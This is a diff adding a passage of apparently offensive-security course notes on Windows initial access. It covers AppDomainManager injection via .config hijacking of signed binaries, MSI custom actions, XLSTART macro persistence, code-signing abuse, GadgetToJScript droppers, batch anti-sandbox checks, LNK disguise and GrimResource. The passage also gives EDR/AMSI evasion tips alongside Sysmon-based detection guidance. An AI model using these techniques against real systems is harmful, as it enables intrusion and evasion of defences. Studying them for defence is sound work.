+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">            </span><span class="n">MessageBox</span><span class="p">.</span><span class="n">Show</span><span class="p">(</span><span class="s">"Hello World"</span><span class="p">,</span><span class="w"> </span><span class="s">"Success"</span><span class="p">);</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>Step 2. Place a legitimate .NET binary and the DLL in the same folder</strong> — Pick one of the signed .NET executables shipped with Windows (e.g. <code>ngentask.exe</code>, <code>dfsvc.exe</code>, <code>UEVAppMonitor.exe</code>) and put the compiled DLL beside it. The <strong>assembly name specified in the config/environment variable must match the actual DLL filename</strong> for it to load.</p>
+<p><strong>Step 3. Choose a trigger (two options)</strong></p>
+<ul>
+<li><strong>Option A — environment variables</strong> (mainly used from a batch file or LNK trigger):</li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nv">$env:APPDOMAIN_MANAGER_ASM</span>  <span class="p">=</span> <span class="s1">'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nv">$env:APPDOMAIN_MANAGER_TYPE</span> <span class="p">=</span> <span class="s1">'AppDomainHijack.DomainManager'</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="p">.\</span><span class="n">ngentask</span><span class="p">.</span><span class="n">exe</span>
+</span></code></pre></div>
+<ul>
+<li><strong>Option B — application config file (<code>.config</code>)</strong> (cleanest for container packaging ⭐): Put a text file named after the executable with <code>.config</code> appended (e.g. <code>ngentask.exe.config</code>) in the same folder, and running just the <code>.exe</code> works without any environment variables.</li>
+</ul>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nt">&lt;configuration&gt;</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">  </span><span class="nt">&lt;runtime&gt;</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span><span class="nt">&lt;appDomainManagerAssembly</span><span class="w"> </span><span class="na">value=</span><span class="s">"AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">    </span><span class="nt">&lt;appDomainManagerType</span><span class="w"> </span><span class="na">value=</span><span class="s">"AppDomainHijack.DomainManager"</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">  </span><span class="nt">&lt;/runtime&gt;</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nt">&lt;/configuration&gt;</span>
+</span></code></pre></div>
+<h3 id="compatibility-patch-matrix-part-1-assessment">[Compatibility &amp; patch matrix] Part 1 assessment<a class="headerlink" href="#compatibility-patch-matrix-part-1-assessment" title="Permanent link">¶</a></h3>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>Target OS / framework compatibility</th>
+<th>Impact of recent patches (Win 10 / Win 11 23H2~24H2)</th>
+<th>Real-world viability &amp; OPSEC tips</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WinSxS-based DLL Side-Loading</td>
+<td><strong>All Windows versions</strong> (Win 10 / Win 11 / Server)</td>
+<td>The <code>WinSxS</code> structure is retained at the OS level. However, modern EDR detects <strong>a default system binary running from an unusual path</strong> behaviourally.</td>
+<td><strong>[High — but change the host]</strong> Using a <strong>third-party legitimately signed executable</strong> as the host instead of a Microsoft default gives a high success rate even on current Win 11 + EDR.</td>
+</tr>
+<tr>
+<td>AppDomainManager Injection</td>
+<td><strong>.NET Framework (v2.0 ~ v4.8.1)</strong> only (built into every Win 10/11)</td>
+<td>Does <strong>not</strong> work on apps built on <strong>.NET Core 3.1+ or .NET 5~9</strong> (use <code>DOTNET_STARTUP_HOOKS</code> instead). <strong>ETW</strong> records the .NET assembly-load event to EDR.</td>
+<td><strong>[Medium-high — still strong]</strong> The <code>.config</code> method leaves no script on disk, so it resists static detection. But the DLL's code must avoid <strong>AMSI/ETW</strong> via obfuscation and dynamic API calls (D/Invoke).</td>
+</tr>
+</tbody>
+</table>
+<h3 id="blue-team-dfir-detection-and-defence">[Blue Team / DFIR] Detection and defence<a class="headerlink" href="#blue-team-dfir-detection-and-defence" title="Permanent link">¶</a></h3>
+<ol>
+<li><strong>Detect <code>OriginalFilename</code> mismatch in the PE header (Sysmon Event ID 1 &amp; 7):</strong> Even if an attacker renames <code>ngentask.exe</code> to <code>PDFViewer.exe</code>, the PE header's <code>OriginalFilename</code> still reads <code>ngentask.exe</code>. EDR alerts when the current filename differs from the header name, or when a file that should live in <code>System32</code>/<code>Framework64</code> runs from <code>Downloads</code> or a mounted virtual drive (<code>D:\</code>, <code>E:\</code>).</li>
+<li><strong>Watch for abnormal <code>.config</code> creation and unsigned DLL loads:</strong> Monitor <code>*.exe.config</code> creation via Sysmon Event ID 11 (FileCreate), and track events where a signed Microsoft binary loads an unsigned DLL.</li>
+</ol>
+<hr>
+<p><a id="part2"></a></p>
+<h1 id="chapter-05-initial-access-part-2">Chapter 05. Initial Access (Part 2)<a class="headerlink" href="#chapter-05-initial-access-part-2" title="Permanent link">¶</a></h1>
+<h3 id="23-windows-installer-msi-packages">2.3 Windows Installer (.MSI) packages<a class="headerlink" href="#23-windows-installer-msi-packages" title="Permanent link">¶</a></h3>
+<h4 id="core-idea_1">Core idea<a class="headerlink" href="#core-idea_1" title="Permanent link">¶</a></h4>
+<p>Windows Installer (<code>.msi</code>) stores the files needed for installation and the per-step actions in an internal relational database (a set of tables). In the taxonomy it can therefore act as <strong>both a Container and a Trigger/Payload</strong>.</p>
+<ul>
+<li><strong>Packaging structure:</strong> Visual Studio's 'Setup Project' lets you place target files into <code>Program Files</code>, the desktop, etc., and manipulate file properties to rename on drop (<code>TargetName</code>) or hide (<code>Hidden: True</code>).</li>
+<li><strong>Abusing Custom Actions:</strong> The main reason MSI is risky is <strong>Custom Actions</strong> — the ability to hook arbitrary executables (<code>.exe</code>), DLLs, or scripts (<code>.vbs</code>, <code>.js</code>) into the install/commit/rollback/uninstall steps.</li>
+<li><strong>Disguise:</strong> Attackers enable the <code>Run64Bit</code> property, pass legitimate-looking arguments like <code>/install /quiet</code>, and fill in a legitimate <code>Manufacturer</code> and <code>ProductName</code> so it looks like normal software in Control Panel and in its install path.</li>
+</ul>
+<h4 id="recent-patches-and-constraints">Recent patches and constraints<a class="headerlink" href="#recent-patches-and-constraints" title="Permanent link">¶</a></h4>
+<ol>
+<li><strong>Parent-child process behaviour detection (EDR):</strong> In the past <code>msiexec.exe</code> executed the payload in the background and evaded ordinary AV. Today, modern EDR (MDE, CrowdStrike, etc.) on Win 10/11 classifies <code>msiexec.exe</code> spawning an unsigned binary or a script engine (<code>wscript.exe</code>, <code>powershell.exe</code>, <code>rundll32.exe</code>) as high risk and blocks it immediately.</li>
+<li><strong>UAC / admin rights:</strong> Configuring the MSI to drop into <code>C:\Program Files</code> triggers a UAC elevation prompt for a standard user. If the victim lacks local admin, the install fails — so real threat groups modify the MSI tables for a per-user install (<code>%LocalAppData%</code> paths) that needs no elevation.</li>
+</ol>
+<h3 id="24-excel-add-in-xlam-and-trusted-locations">2.4 Excel Add-In (.XLAM) and Trusted Locations<a class="headerlink" href="#24-excel-add-in-xlam-and-trusted-locations" title="Permanent link">¶</a></h3>
+<h4 id="core-idea_2">Core idea<a class="headerlink" href="#core-idea_2" title="Permanent link">¶</a></h4>
+<p>Ordinary macro documents (<code>.docm</code>, <code>.xlsm</code>) are blocked from running macros by the MotW tag applied on download and by Office's Protected View. This technique bypasses that by combining an Excel add-in (<code>.xlam</code>) with Office's Trusted Locations.</p>
+<ul>
+<li><strong>The Trusted Locations gap:</strong> For files opened from certain folders registered in the Trust Center, Office skips security checks and enables macros immediately:<ul>
+<li><code>%ProgramFiles%\Microsoft Office\root\Office16\XLSTART\</code> (not writable by a standard user)</li>
+<li><strong><code>%APPDATA%\Microsoft\Excel\XLSTART\</code> (writable by a standard user ⭐)</strong></li>
+<li><code>%APPDATA%\Microsoft\Templates\</code> (writable by a standard user)</li>
+</ul>
+</li>
+<li><strong>Auto-run mechanism:</strong> The <code>XLSTART</code> folder auto-loads every workbook/add-in (<code>.xlam</code>) in it each time Excel starts, with no user consent. A <code>.xlam</code> containing an <code>Auto_Open()</code> subroutine copied there runs its macro on the next launch — so it doubles as a <strong>persistence</strong> technique.</li>
+</ul>
+<h4 id="recent-patches-and-constraints_1">Recent patches and constraints<a class="headerlink" href="#recent-patches-and-constraints_1" title="Permanent link">¶</a></h4>
+<ol>
+<li><strong>Blocked by ASR (Attack Surface Reduction) rules:</strong> Even if you strip MotW via a container and auto-run through <code>XLSTART</code>, Defender ASR (if enabled on Win 10/11 Enterprise) blocks the post-macro steps. (Key rules: "Block all Office applications from creating child processes", "Block Office applications from creating executable content", "Block Win32 API calls from Office macros".)</li>
+<li><strong>Tighter control of Excel 4.0 (XLM) and XLL:</strong> Besides VBA-based <code>.xlam</code>, C/C++ DLL add-ins (<code>.xll</code>) were heavily abused — but recent M365 updates greatly strengthened blocking of internet-sourced add-ins and AMSI's runtime memory scanning of macros.</li>
+</ol>
+<h3 id="25-code-signing-and-the-shift-in-the-smartscreen-trust-model">2.5 Code signing and the shift in the SmartScreen trust model<a class="headerlink" href="#25-code-signing-and-the-shift-in-the-smartscreen-trust-model" title="Permanent link">¶</a></h3>
+<h4 id="core-idea_3">Core idea<a class="headerlink" href="#core-idea_3" title="Permanent link">¶</a></h4>
+<p>Code signing adds a digital signature to an executable or installer to assure the publisher's identity and file integrity. <strong>Microsoft Defender SmartScreen</strong> treats signing as a key trust signal; signed files trigger far fewer (or no) warnings and fare better in static AV/EDR verdicts.</p>
+<ul>
+<li><strong>Standard vs. EV certificates (as the course describes):</strong><ul>
+<li><strong>Standard:</strong> Signs the file, but SmartScreen warnings still appear until the certificate has built up global download reputation.</li>
+<li><strong>EV (Extended Validation):</strong> Issued after strict vetting; historically earned instant SmartScreen trust on first use, fully removing the 'Unknown Publisher' warning.</li>
+</ul>
+</li>
+<li><strong>How attackers obtain certificates:</strong> Signing under their own company name gets them identified and revoked immediately, so they set up shell companies or steal other companies' certificates leaked in public repos, buckets, or forums.</li>
+</ul>
+<h4 id="essential-update-the-upheaval-in-code-signing-and-smartscreen-policy-20232026">[Essential update] The upheaval in code-signing and SmartScreen policy (2023~2026)<a class="headerlink" href="#essential-update-the-upheaval-in-code-signing-and-smartscreen-policy-20232026" title="Permanent link">¶</a></h4>
+<p>This is where the course and today's environment diverge most.</p>
+<ol>
+<li><strong>Hardware token (HSM) storage mandated (CA/Browser Forum rule change):</strong> Since June 2023, <strong>even Standard code-signing certificates are no longer issued as <code>.pfx</code>/<code>.p12</code> files.</strong> All private keys must live only in a physical hardware token (FIPS 140-2 Level 2 or higher) or a cloud HSM (Azure Key Vault, AWS KMS). This sharply reduced "steal a <code>.pfx</code> and sign locally" attacks, shifting the threat toward hijacking cloud CI/CD signing permissions.</li>
+<li><strong>EV's 'instant SmartScreen bypass' privilege removed:</strong> After a surge of EV abuse via shell companies, Microsoft overhauled the SmartScreen scoring algorithm. <strong>On current Win 10/11, an EV signature no longer grants instant reputation</strong>, and warnings persist — regardless of EV status — until reputation is established from file/signer history and distribution volume.</li>
+</ol>
+<h3 id="26-droppers-and-net-deserialization-gadgettojscript">2.6 Droppers and .NET deserialization (GadgetToJScript)<a class="headerlink" href="#26-droppers-and-net-deserialization-gadgettojscript" title="Permanent link">¶</a></h3>
+<h4 id="core-idea_4">Core idea<a class="headerlink" href="#core-idea_4" title="Permanent link">¶</a></h4>
+<p>A dropper is an intermediate program that doesn't expose the final payload in the container, but hides it in its own embedded resource and either writes it to disk or downloads it at runtime.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>[How a GadgetToJScript-based dropper works]
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>1. Build .NET DLL (C#)        2. Serialize &amp; convert to script     3. Runs on victim PC
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>┌──────────────────────┐    ┌──────────────────────────┐    ┌────────────────────────┐
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>│ MyDropper.dll        │    │ GadgetToJScript tool     │    │ Double-click dropper.js│
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>│  └─ Embedded Resource│ ──&gt;│  └─ Build .NET gadget    │ ──&gt;│  └─ wscript.exe runs   │
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>│     (http_x64.exe)   │    │  └─ Base64 encode (to JS)│    │  └─ Deserialize in mem │
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>└──────────────────────┘    └──────────────────────────┘    └───────────┬────────────┘
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>                                                                        │
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>                                                                        ▼
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>                                                            ┌────────────────────────┐
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>                                                            │ C# constructor auto-runs│
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>                                                            │  └─ Drops/runs EXE under│
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>                                                            │     C:\ProgramData\...  │
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>                                                            └────────────────────────┘
+</span></code></pre></div>
+<ul>
+<li><strong>Reflection and resource extraction:</strong> The executable is embedded as a resource in a C# library, and the class constructor reads it into memory via <code>Assembly.GetExecutingAssembly().GetManifestResourceStream()</code>.</li>
+<li><strong>Choosing a drop location (OPSEC):</strong> Dropping into <code>%TEMP%</code> or the home directory gets detected immediately. So droppers create a sub-folder under <strong><code>C:\ProgramData\*</code></strong> — a standard path that even a standard user can write to and create folders in.</li>
+<li><strong>Turning it into a script with GadgetToJScript:</strong> A compiled .NET DLL can't run by itself, so <code>GadgetToJScript</code> abuses <strong>.NET deserialization</strong> to convert the assembly into <code>.js</code>/<code>.vbs</code>/VBA/HTA script. When the victim runs the <code>.js</code> (<code>wscript.exe</code>), the object deserializes in memory and the dropper code in the constructor executes.</li>
+</ul>
+<h4 id="recent-patches-and-constraints_2">Recent patches and constraints<a class="headerlink" href="#recent-patches-and-constraints_2" title="Permanent link">¶</a></h4>
+<ol>
+<li><strong>AMSI fully integrated:</strong> When <code>wscript.exe</code>/<code>cscript.exe</code> runs a <code>.js</code>/<code>.vbs</code>, the engine hands the plaintext to AV via <strong>AMSI</strong> right before execution. The serialized gadget patterns <code>GadgetToJScript</code> produces now have signatures in every commercial AV/EDR, so without obfuscation/AMSI bypass they're blocked on run.</li>
+<li><strong>Retirement of .NET <code>BinaryFormatter</code>:</strong> <code>BinaryFormatter</code> deserialization is disabled by default in recent .NET due to its risk, and even on 4.8.1 the EDR's ETW telemetry watches in-memory <code>Assembly.Load</code> in real time.</li>
+<li><strong>Win 11 restrictions on JScript/VBScript:</strong> To curb legacy-script-engine infections, Microsoft is restricting WSH and VBScript defaults or removing them as optional features (FOD).</li>
+</ol>
+<h3 id="compatibility-patch-matrix-part-2-assessment">[Compatibility &amp; patch matrix] Part 2 assessment<a class="headerlink" href="#compatibility-patch-matrix-part-2-assessment" title="Permanent link">¶</a></h3>
+<table>
+<thead>
+<tr>
+<th>Category / technique</th>
+<th>Target OS / environment</th>
+<th>Impact of recent patches</th>
+<th>Blue Team detection focus</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Windows Installer (<code>.msi</code>)</td>
+<td><strong>All Windows versions</strong> (built-in <code>msiexec.exe</code>)</td>
+<td>UAC prompt when targeting <code>Program Files</code>. EDR behavioural detection when <code>msiexec.exe</code> spawns an abnormal child process.</td>
+<td><strong>Sysmon ID 1:</strong> parent <code>msiexec.exe</code> with a child that is unsigned or runs from <code>C:\ProgramData</code>. Static analysis of the MSI CustomAction table (Orca).</td>
+</tr>
+<tr>
+<td>Excel Add-In (<code>.xlam</code>)</td>
+<td><strong>MS Office</strong> (2016/2019/M365)</td>
+<td><code>XLSTART</code> is still a Trusted Location. But ASR, when enabled, blocks macro-driven process creation and Win32 API calls.</td>
+<td><strong>Sysmon ID 11:</strong> real-time monitoring of new files in <code>%APPDATA%\Microsoft\Excel\XLSTART\</code> and <code>AddIns</code> (top-priority rule).</td>
+</tr>
+<tr>
+<td>Code Signing (EV cert)</td>
+<td><strong>All Windows versions</strong> (SmartScreen)</td>
+<td><strong>HSM storage mandated</strong>, reducing cert leaks. <strong>EV instant-bypass privilege removed</strong> (merged into reputation).</td>
+<td>Even for signed binaries, cross-check certificate issue date, unfamiliar publisher name, and first-seen prevalence in the org.</td>
+</tr>
+<tr>
+<td>GadgetToJScript (<code>.js</code>/<code>.vbs</code> dropper)</td>
+<td><strong>.NET Framework 4.8.x</strong> (built into Win 10/11)</td>
+<td><strong>AMSI and .NET ETW</strong> detect serialized gadget patterns with high probability. Drop-<code>.exe</code>-then-<code>Process.Start</code> is weak against EDR.</td>
+<td>Detect <code>wscript.exe</code>/<code>cscript.exe</code> loading .NET CLR DLLs (<code>clr.dll</code>, <code>mscoree.dll</code>) in memory (Sysmon ID 7). Watch for new executables under <code>C:\ProgramData</code>.</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<p><a id="triggers"></a></p>
+<h1 id="chapter-3-triggers-initial-execution-anti-sandbox">Chapter 3. Triggers (initial execution &amp; anti-sandbox)<a class="headerlink" href="#chapter-3-triggers-initial-execution-anti-sandbox" title="Permanent link">¶</a></h1>
+<p>A trigger is the file the victim first interacts with (usually a double-click) after mounting/extracting a container. Its goals are to disguise itself as a familiar file to avoid suspicion, and to run the payload and a benign decoy at the same time in the background.</p>
+<h3 id="31-batch-scripts-bat-cmd-and-env-variable-anti-sandbox">3.1 Batch scripts (<code>.bat</code>, <code>.cmd</code>) and env-variable anti-sandbox<a class="headerlink" href="#31-batch-scripts-bat-cmd-and-env-variable-anti-sandbox" title="Permanent link">¶</a></h3>
+<h4 id="core-idea_5">Core idea<a class="headerlink" href="#core-idea_5" title="Permanent link">¶</a></h4>
+<p>A text script format that runs commands sequentially through <code>cmd.exe</code> (<code>.bat</code>, <code>.cmd</code>, <code>.btm</code>).</p>
+<ul>
+<li><strong>Hiding the window:</strong> <code>@echo off</code> at the top plus <code>&gt; nul 2&gt;&amp;1</code> on commands hides stdout and stderr.</li>
+<li><strong>Env-variable anti-sandbox trick:</strong> To evade automated AV emulators/sandboxes, the batch checks whether it was launched by a real double-click or by an analysis CLI, by comparing environment variables.</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>[How environment variables differ by launch method]
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>1. User double-clicks in Explorer:
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>   • %cmdcmdline% : C:\Windows\system32\cmd.exe /c ""C:\Users\Victim\Desktop\test.bat" "
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>   • %~f0         : C:\Users\Victim\Desktop\test.bat
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>   ▶ %cmdcmdline% contains %~f0 (the script path) -&gt; proceed as normal
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>2. A sandbox/analyst runs it from an already-open CMD:
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>   • %cmdcmdline% : "C:\Windows\System32\cmd.exe"
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>   • %~f0         : C:\Users\Victim\Desktop\test.bat
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>   ▶ %cmdcmdline% does NOT contain the script path -&gt; treat as analysis, exit immediately
+</span></code></pre></div>
+<p>In short, it pipes <code>%cmdcmdline%</code> to <code>find /i "%~f0"</code> to search for the current batch path, and if no match (<code>||</code>) it <code>exit</code>s immediately, defeating programmatic automated analysis.</p>
+<h4 id="recent-patches-and-constraints_3">Recent patches and constraints<a class="headerlink" href="#recent-patches-and-constraints_3" title="Permanent link">¶</a></h4>
+<ol>
+<li><strong>Can't change the default icon (social-engineering limit):</strong> <code>.bat</code>/<code>.cmd</code> can't carry their own icon resource and always show the default batch icon. Used alone they're easily spotted, so they're mostly a 2nd-stage script invoked hidden by a <code>.lnk</code> or another trigger.</li>
+<li><strong>EDR command-line auditing and AMSI:</strong> Every child process spawned via <code>cmd.exe /c</code> has its full command line recorded to the security log (Event ID 4688, Sysmon ID 1). Modern Defender/EDR also detect obfuscation patterns (e.g. substring tricks like <code>%var:~0,1%</code>) statically and dynamically.</li>
+</ol>
+<h3 id="32-windows-shell-link-lnk-shortcut-files">3.2 Windows Shell Link (<code>.lnk</code> shortcut files)<a class="headerlink" href="#32-windows-shell-link-lnk-shortcut-files" title="Permanent link">¶</a></h3>
+<h4 id="core-idea_6">Core idea<a class="headerlink" href="#core-idea_6" title="Permanent link">¶</a></h4>
+<p>The <code>.lnk</code> (Shell Link) binary format is the most widely used deceptive trigger in initial access.</p>
+<ul>
+<li><strong>Extension hiding via NeverShowExt:</strong> Even with 'Show file name extensions' enabled, the <code>.lnk</code> extension is <strong>never displayed</strong>, thanks to the registry <code>NeverShowExt</code> attribute. Naming a file <code>report.pdf.lnk</code> makes it appear as exactly <code>report.pdf</code>.</li>
+<li><strong>Icon disguise and compound commands:</strong> Using the <code>WScript.Shell</code> COM object, the target (<code>TargetPath</code>) can be set to <code>%COMSPEC%</code> (<code>cmd.exe</code>) while the icon (<code>IconLocation</code>) is overridden with an Edge (<code>msedge.exe, 13</code> — the built-in PDF icon) or Excel (<code>EXCEL.EXE, 0</code>) icon.</li>
+<li><strong>Driving hidden files:</strong> If a payload inside the container (e.g. <code>macros.xlam</code>) has the hidden attribute, the <code>.lnk</code>'s <code>Arguments</code> can <code>xcopy /H</code> it into <code>%APPDATA%\Microsoft\Excel\XLSTART\</code>, clear the hidden attribute with <code>attrib -H</code>, and open the decoy (<code>sales.xlsx</code>) — all in a single click.</li>
+</ul>
+<h4 id="recent-patches-and-constraints_4">Recent patches and constraints<a class="headerlink" href="#recent-patches-and-constraints_4" title="Permanent link">¶</a></h4>
+<ol>
+<li><strong>Stronger SmartScreen/MotW checks (CVE-2022-44698, CVE-2023-36025, CVE-2024-21412 patches):</strong> There used to be bugs where a <code>.lnk</code> with MotW bypassed SmartScreen, but concentrated patching means <strong>current Win 10/11 builds strictly check the target path and arguments of an externally sourced <code>.lnk</code></strong>.</li>
+<li><strong><code>explorer.exe</code> → <code>cmd.exe</code>/<code>powershell.exe</code> process-tree detection:</strong> When a <code>.lnk</code> click launches <code>cmd</code>/<code>powershell</code>, the parent is recorded as <code>explorer.exe</code> and the command line shows <code>&amp;&amp;</code>, <code>start</code>, <code>xcopy</code>, etc. That is a basic block/alert condition in modern EDR and ASR.</li>
+<li><strong>Current trend (LNK + LOLBins/side-loading):</strong> Instead of putting the heavily detected <code>cmd</code>/<code>powershell</code> directly in <code>TargetPath</code>, operators now point it at a legitimately signed executable (a DLL side-loading host) hidden alongside in the container, skipping the script-interpreter call entirely.</li>
+</ol>
+<h3 id="33-microsoft-saved-console-msc-grimresource">3.3 Microsoft Saved Console (<code>.msc</code> — GrimResource)<a class="headerlink" href="#33-microsoft-saved-console-msc-grimresource" title="Permanent link">¶</a></h3>
+<h4 id="core-idea_7">Core idea<a class="headerlink" href="#core-idea_7" title="Permanent link">¶</a></h4>
+<p>Discovered and named 'GrimResource' by Elastic Security Labs in 2024, this abuses the <code>.msc</code> (Microsoft Saved Console) format — the settings file for the Windows management console (<code>mmc.exe</code>).</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>[GrimResource (.msc) execution flow]
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>[Victim: double-clicks a malicious .msc file]
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>       │
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>       ▼
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>┌────────────────────────────────────────────────────────┐
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>│ 1. mmc.exe runs (auto-elevating)                        │
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>│    └─ If a local admin, gains High Integrity            │
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>└───────────────────────────┬────────────────────────────┘
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>                            │ (parses the .msc internal XML)
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>                            ▼
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>┌────────────────────────────────────────────────────────┐
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>│ 2. Triggers an XSS flaw in apds.dll (StringTable abuse) │
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>│    └─ Loads a URL-encoded XSL stylesheet (xsl.loadXML)  │
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>└───────────────────────────┬────────────────────────────┘
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>                            │ (invokes the XSLT script engine)
+</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>                            ▼
+</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>┌────────────────────────────────────────────────────────┐
+</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>│ 3. Runs embedded VBScript / JScript                     │
+</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>│    └─ WScript.Shell or a DotNetToJScript payload        │
+</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>└────────────────────────────────────────────────────────┘
+</span></code></pre></div>
+<ul>
